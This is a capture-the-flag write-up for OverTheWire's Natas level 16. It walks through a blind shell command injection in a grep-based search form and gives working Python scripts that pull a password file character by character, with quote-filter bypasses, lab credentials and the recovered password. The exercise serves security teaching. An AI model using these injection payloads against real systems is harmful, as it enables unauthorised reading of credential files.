# Level 15 → Level 16

## Details
Username: `natas16`<br />
Password: `TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V`<br />
URL:      http://natas16.natas.labs.overthewire.org

## Solution
This was one of the challenges that took me the longest. I will spare you all the attempts and only explain the solution.

<img src="./0.png"></img>

<img src="./1.png"></img>

Since I couldn't "break" the quotes, I started running bash code inside them. The main idea behind it is to deduce each time one character in the password according to the output of grep on dictionary.txt. (Similar to the blind sql injection of the previous challenge).

The following code, `$(cut -c 1-1 /etc/natas_webpass/natas17)` extracts the first character in the password. Then the php code will append this character to grep on the dictionay.txt file. Therefore, out of all the words that will appear in the output, the character that will appear in all of them is actually the character that was extracted from the password.

For example: 
<img src="./2.png"></img>

<img src="./3.png"></img>

So, the first char for password of **natas17** is 'x' or 'X'. It is not possible to tell from this output whether it is an uppercase or lowercase letter, because of `grep -i`.

Let's see an example of a password we already know, of the current stage. The first letter in it is 'T'. We will insert the string `$(cut -c 1-1 /etc/natas_webpass/natas16)` in the input and get the following output:

<img src="./4.png"></img>

And so in the meantime we can recognize letters of the password, without knowing if they are uppercase or lowercase. But what about digits? Let's try to see what happens when we exstract a character that is a digit. The fourth character in the password that we already know is the digit '7'. Let's see what the output is when we try to extract this character with the input `$(cut -c 4-4 /etc/natas_webpass/natas16)`:

<img src="./5.png"></img>

Nothing. This means that currently, only letters can be detected in case insensitive form. And it is still not possible to discover digits. We will now build a Python code that extracts all the characters that are letters, and print them in lower case (for convenience).

```python
from requests import post
from requests.utils import quote

PASSWORD_FILENAME = '/etc/natas_webpass/natas17'
PASSWORD_LENGTH = 32
CASE_INSENSITIVE_LETTER_EXTRACTION = "$(cut -c {}-{} {})"

# details for the POST HTTP request.
URL = "http://natas16.natas.labs.overthewire.org/index.php"
HEADERS ={}
HEADERS["Authorization"] = "Basic bmF0YXMxNjpUUkQ3aVpyZDVnQVRqajlQa1BFdWFPbGZFakhxajMyVg=="
HEADERS["Content-Type"] = "application/x-www-form-urlencoded"
DATA = "needle="

def get_dictionary_words(html):
    """
    Returns a list of all the words that appeared as output
    from dictionary.txt in the html page
    """
    html = html.lower()
    return html[html.find('<pre>')+6:html.find('</pre>')].split('\n')[:-1]

def get_common_letter(words_list):
    """
    Gets a list of words and returns the letter that appeared in all the words.
    """
    # If the list is empty, it is a sign that a digit has been extracted.
    if not words_list: return '_'
    
    # Takes the shortest word, because then the test will be faster.
    words_list.sort(key=len)
    shortes_word = words_list[0]
    
    # If the short word contains one letter, then it is common to all.
    if(len(shortes_word) == 1): return shortes_word
    
    # Looking for the letter that appears in all the words:
    for letter in shortes_word:
        is_common = True  
        
        for word in words_list:
            if letter not in word:
                is_common = False
                break

        if is_common: return letter

password = ""
for i in range(1, PASSWORD_LENGTH+1):
    res = post(url=URL, headers=HEADERS, data=DATA+quote(CASE_INSENSITIVE_LETTER_EXTRACTION.format(i,i,PASSWORD_FILENAME)))
    password += get_common_letter(get_dictionary_words(res.text))
    print("password: " + password.ljust(32, "_"))
```

Take the code above and copy it into a Python file. Run it, and you will get the following output:

<img src="./6.png"></img>

So these are the characters of the password in case insensitive form, where each underscore represents a place of a digit: `xkeuche_sbnkbvh_ru_ksib_uulmi_sd`

Our next goal will be to get the digits. The idea is to produce a code that extracts a digit, turns it into a letter, and according to the letter we can reproduce the digit.<br />
'0' --> 'a', '1' --> 'b' and so on.<br /> 
We know that the fourth character in the password for **natas16** (the current challenge) is the digit '7'. We will create the code and check that the letter that is discovered will be 'h'.

I used the following [source](https://stackoverflow.com/questions/12855610/shell-script-is-there-any-way-converting-number-to-char) to export the code `$(printf \\$(printf %03o $((97+$(cut -c 4-4 /etc/natas_webpass/natas16)))))`. And this is the output:

<img src="./7.png"></img>

The letter common to all words is 'h'. And from this we conclude that the extracted character was the digit '7'. We already know the password, so we know that it is really true. Now we will create a Python code that goes through all the characters that are "_" in the password, and extracts the respective digits for them:

```python
from requests import post
from requests.utils import quote

PASSWORD_FILENAME = '/etc/natas_webpass/natas17'
PASSWORD_LENGTH = 32
DIGIT_EXTRACTION = "$(printf \\\$(printf %03o $((97+$(cut -c {}-{} {})))))"

# details for the POST HTTP request.
URL = "http://natas16.natas.labs.overthewire.org/index.php"
HEADERS ={}
HEADERS["Authorization"] = "Basic bmF0YXMxNjpUUkQ3aVpyZDVnQVRqajlQa1BFdWFPbGZFakhxajMyVg=="
HEADERS["Content-Type"] = "application/x-www-form-urlencoded"
DATA = "needle="

def get_dictionary_words(html):
    """
    Returns a list of all the words that appeared as output
    from dictionary.txt in the html page
    """
    html = html.lower()
    return html[html.find('<pre>')+6:html.find('</pre>')].split('\n')[:-1]

def get_common_letter(words_list):
    """
    Gets a list of words and returns the letter that appeared in all the words.
    """
    # If the list is empty, it is a sign that a digit has been extracted.
    if not words_list: return '_'
    
    # Takes the shortest word, because then the test will be faster.
    words_list.sort(key=len)
    shortes_word = words_list[0]
    
    # If the short word contains one letter, then it is common to all.
    if(len(shortes_word) == 1): return shortes_word
    
    # Looking for the letter that appears in all the words:
    for letter in shortes_word:
        is_common = True  
        
        for word in words_list:
            if letter not in word:
                is_common = False
                break

        if is_common: return letter

password = "xkeuche_sbnkbvh_ru_ksib_uulmi_sd"
while('_' in password):
    i = password.find('_')
    res = post(url=URL, headers=HEADERS, data=DATA+quote(DIGIT_EXTRACTION.format(i+1, i+1, PASSWORD_FILENAME)))
    letter = get_common_letter(get_dictionary_words(res.text))
    digit = str(ord(letter) - ord('a'))
    password = password.replace('_', digit, 1)
    print("password: " + password.ljust(32, "_"))
```

Take the code above and copy it into a Python file. Run it, and you will get the following output:

<img src="./8.png"></img>

So the password in lowercase looks like this: `xkeuche0sbnkbvh1ru7ksib9uulmi7sd`<br />

The next goal will be to go through each letter and determine whether it is uppercase or lowercase. It took me a lot of time... both to think what to do, and to try to do what I thought. Eventually My main idea is this:<br />
**Given a letter from the password file, we subtract its lowercase from it (which is already known). If we got a 0, we converted it to the character 'a' and that was a sign that the character was a lowercase letter. But if the common letter that comes out is not 'a', then it would have been a capital letter (because the result of the subtraction was not 0).**

I made several attempts to create the appropriate input, within the limit of forbidden characters. I tried to use tools like **tr** and **xxd** for number-to-letter conversion needs and found out that apparently they cannot be run on the server.

Then, a thought crossed my mind that it might be possible to run Python on the server with `python -c`.

It is written [here](https://askubuntu.com/questions/1195561/what-does-c-or-m-mean-in-the-command-line) that in order to use `python -c` you need to put the command that will run in quotation marks. But quotes are forbidden characters... so after some trial and error on my local computer I found a way to ignore the quotes. The command `python3 -c 'print("a")'` is exactly the same as writing `python3 -c print\(chr\(97\)\)` (because in python `'a'==chr(97)` and the '\' that comes before each special character eliminates the need for quotation marks around the entire command). If so, we will try to inject the following command: `$(python3 -c print\(chr\(97\)\))`

<img src="./9.png"></img>

The letter they all have in common is 'a'. That is, we managed to run Python code on the server!

To start building the correct string, let's start by looking at the following bash code:

```bash
# Note: for example, 's' is the letter and 115 is the ascii of it. 
python3 -c 'print(chr(97+115-ord("s")))'
# Output: a
```
But, because the command must not be wrapped in quotation marks, we will avoid them by using `\`'s:

```bash
python3 -c print\(chr\(97+115-ord\(\"s\"\)\)\)
# Output: a
```

But, for exactly the same reason as before, the quotation marks surrounding the letter 's' are also forbidden. But because of the `ord` function it is necessary to have quotation marks. And so we will **create them** in the code:
*   ```python
    '\"'==chr(34) # python
    ```

* so, let's build it in bash
    ```bash
    python3 -c 'print(chr(34))'
    # Output: "
    ```
* and we will omit quotation marks that surround the command like this:
    ```bash
    python3 -c print\(chr\(34\)\)
    # Output: "
    ```
* Therefore, every time we want the `"` character to appear in the actual code, we will inject the following code:
    ```bash
    $(python3 -c print\(chr\(34\)\))
    ```

So now we can replace each of the `"` characters around the letter 's' with the code that creates them, and we get the following code:

```bash
python3 -c print\(chr\(97+115-ord\($(python3 -c print\(chr\(34\)\))s$(python3 -c print\(chr\(34\)\))\)\)\)
# Output: a
```

Remember that the letter 's' was just an example of a letter extracted from the password file. Therefore, we will replace 's' with a code that extracts a character from the password file. We can summarize the whole process like this:

```python
# For example: 
natas16_password = 'TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V'
index = 4 # for example, remember to add +1 for cut command
letter = natas16_password[index]
password_filename = "/etc/natas_webpass/natas16"

quotation_marks = "$(python3 -c print\(chr\(34\)\))"
character_extraction = "$(cut -c {}-{} {})".format(index+1, index+1, password_filename)

cmd = "$(python3 -c print\(chr\(97+{}-ord\({}{}{}\)\)\))".format(ord(letter), quotation_marks, character_extraction, quotation_marks)

print(cmd)
# Output:
"""
$(python3 -c print\(chr\(97+105-ord\($(python3 -c print\(chr\(34\)\))$(cut -c 5-5 /etc/natas_webpass/natas16)$(python3 -c print\(chr\(34\)\))\)\)\))
"""
```

To check that we did get 'a' (which indicates that the letter in the password was a lowercase letter 'i'), we will take the output and enter it on the website. The list of words that came out will be:

<img src="./10.png"></img>

It worked! The letter common to all words is 'a'. This means that the character from the password minus lowercase 'i' was 0. That means the character from the password was 'i' itself as a lowercase letter (and not 'I'). And so when the result in the common letter is not 'a', we can conclude that the original character from the password was an uppercase letter.

Now we can build a Python code that works with the password already found, replacing each character with an uppercase letter if necessary:

```python
from requests import post
from requests.utils import quote

PASSWORD_FILENAME = '/etc/natas_webpass/natas17'
PASSWORD_LENGTH = 32
CASE_INSENSITIVE_LETTER_EXTRACTION = "$(cut -c {}-{} {})"
quotation_mark = "$(python3 -c print\(chr\(34\)\))"
DETECT_LOWER_CASE = "$(python3 -c print\(chr\(97+{}-ord\("+quotation_mark + CASE_INSENSITIVE_LETTER_EXTRACTION + quotation_mark+"\)\)\))"

# details for the POST HTTP request.
URL = "http://natas16.natas.labs.overthewire.org/index.php"
HEADERS ={}
HEADERS["Authorization"] = "Basic bmF0YXMxNjpUUkQ3aVpyZDVnQVRqajlQa1BFdWFPbGZFakhxajMyVg=="
HEADERS["Content-Type"] = "application/x-www-form-urlencoded"
DATA = "needle="

def get_dictionary_words(html):
    """
    Returns a list of all the words that appeared as output
    from dictionary.txt in the html page
    """
    html = html.lower()
    return html[html.find('<pre>')+6:html.find('</pre>')].split('\n')[:-1]

def get_common_letter(words_list):
    """
    Gets a list of words and returns the letter that appeared in all the words.
    """
    # If the list is empty, it is a sign that a digit has been extracted.
    if not words_list: return '_'
    
    # Takes the shortest word, because then the test will be faster.
    words_list.sort(key=len)
    shortes_word = words_list[0]
    
    # If the short word contains one letter, then it is common to all.
    if(len(shortes_word) == 1): return shortes_word
    
    # Looking for the letter that appears in all the words:
    for letter in shortes_word:
        is_common = True  
        
        for word in words_list:
            if letter not in word:
                is_common = False
                break

        if is_common: return letter

password = "xkeuche0sbnkbvh1ru7ksib9uulmi7sd"
for i in range(PASSWORD_LENGTH):
    if password[i].isalnum():
        res = post(url=URL, headers=HEADERS, data=DATA+quote(DETECT_LOWER_CASE.format(ord(password[i]),i+1,i+1,PASSWORD_FILENAME)))
        letter = get_common_letter(get_dictionary_words(res.text))
        if letter != 'a':
            password = password[:i] + password[i].upper() + password[i+1:]
            print("password: " + password.ljust(32, "_"))
```

Take the code above and copy it into a Python file. Run it, and you will get the following output:

<img src="./11.png"></img>

And this is the password!
To organize the code in one place, see the appendix at the end.

## Password for the next level:
```
XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd
```

## Appendix
Below is a Python file summarizing the password discovery process. Copy it to a Python file and run it.

```python
from requests import post
from requests.utils import quote

PASSWORD_FILENAME = '/etc/natas_webpass/natas17'
PASSWORD_LENGTH = 32
CASE_INSENSITIVE_LETTER_EXTRACTION = "$(cut -c {}-{} {})"
DIGIT_EXTRACTION = "$(printf \\\$(printf %03o $((97+$(cut -c {}-{} {})))))"
DETECT_LOWER_CASE = "$(python3 -c print\(chr\(97+{}-ord\($(python3 -c print\(chr\(34\)\))$(cut -c {}-{} {})$(python3 -c print\(chr\(34\)\))\)\)\))"

# details for the POST HTTP request.
URL = "http://natas16.natas.labs.overthewire.org/index.php"
HEADERS ={}
HEADERS["Authorization"] =\
"Basic bmF0YXMxNjpUUkQ3aVpyZDVnQVRqajlQa1BFdWFPbGZFakhxajMyVg=="
HEADERS["Content-Type"] = "application/x-www-form-urlencoded"
DATA = "needle="

def get_dictionary_words(html):
    """
    Returns a list of all the words that appeared as output
    from dictionary.txt in the html page
    """
    html = html.lower()
    return html[html.find('<pre>')+6:html.find('</pre>')].split('\n')[:-1]

def get_common_letter(words_list):
    """
    Gets a list of words and returns the letter that appeared in all the words.
    """
    # If the list is empty, it is a sign that a digit has been extracted.
    if not words_list: return '_'
    
    # Takes the shortest word, because then the test will be faster.
    words_list.sort(key=len)
    shortes_word = words_list[0]
    
    # If the short word contains one letter, then it is common to all.
    if(len(shortes_word) == 1): return shortes_word
    
    # Looking for the letter that appears in all the words:
    for letter in shortes_word:
        is_common = True  
        
        for word in words_list:
            if letter not in word:
                is_common = False
                break

        if is_common: return letter

password = ""

# stage 1
print("FIND CASE-INSENSITIVE LETTERS:") 
for i in range(1, PASSWORD_LENGTH+1):
    res = post(url=URL, headers=HEADERS, data=DATA+quote(CASE_INSENSITIVE_LETTER_EXTRACTION.format(i,i,PASSWORD_FILENAME)))
    password += get_common_letter(get_dictionary_words(res.text))
    print("password: " + password.ljust(32, "_"))
    
# stage 2
print("FIND DIGITS:") 
while('_' in password):
    i = password.find('_')
    res = post(url=URL, headers=HEADERS, data=DATA+quote(DIGIT_EXTRACTION.format(i+1, i+1, PASSWORD_FILENAME)))
    letter = get_common_letter(get_dictionary_words(res.text))
    digit = str(ord(letter) - ord('a'))
    password = password.replace('_', digit, 1)
    print("password: " + password.ljust(32, "_"))

# stage 3
print("DETECT UPPERCASE LETTERS:")
for i in range(PASSWORD_LENGTH):
    if password[i].isalnum():
        res = post(url=URL, headers=HEADERS, data=DATA+quote(DETECT_LOWER_CASE.format(ord(password[i]),i+1,i+1,PASSWORD_FILENAME)))
        letter = get_common_letter(get_dictionary_words(res.text))
        if letter != 'a':
            password = password[:i] + password[i].upper() + password[i+1:]
            print("password: " + password.ljust(32, "_"))

print("Final password for natas17: " + password)
```
